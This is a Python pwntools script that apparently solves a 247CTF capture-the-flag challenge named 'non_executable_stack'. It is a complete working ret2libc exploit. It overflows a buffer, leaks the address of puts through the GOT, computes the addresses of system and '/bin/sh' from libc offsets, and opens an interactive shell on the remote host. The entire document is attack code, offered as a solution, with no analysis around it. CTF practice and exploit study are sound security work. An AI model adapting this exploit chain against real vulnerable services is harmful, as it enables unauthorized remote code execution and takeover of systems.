#!/bin/python3

from pwn import *
import requests

p = remote('10fe909e85e7f275.247ctf.com', 50333)
elf = ELF('./non_executable_stack')
elf_rop= ROP(elf)

pop_ebx_ret = elf_rop.find_gadget(['pop ebx', 'ret'])[0]

chain = p32(elf.plt['puts'])    \
    + p32(pop_ebx_ret)          \
    + p32(elf.got['puts'])      \
    + p32(elf.sym['_start'])
payload = b'i' * 0x2C + chain
p.sendline(payload)

p.recvuntil(b'Incorrect secret password!\n')
puts_addr = int.from_bytes(p.recv(4), 'little')

"""

These offsets were found using https://libc.blukat.me/
    since my local version of libc was not the same

"""
system_difference = -0x2A650
bin_sh_difference = 0x11456F

chain = p32(puts_addr + system_difference)      \
    + p32(pop_ebx_ret)                          \
    + p32(puts_addr + bin_sh_difference)
payload = b'i' * 0x2C + chain
p.sendline(payload)

# Should have a shell at this point, can cat it manually
p.recvuntil(b'Incorrect secret password!')
p.interactive()

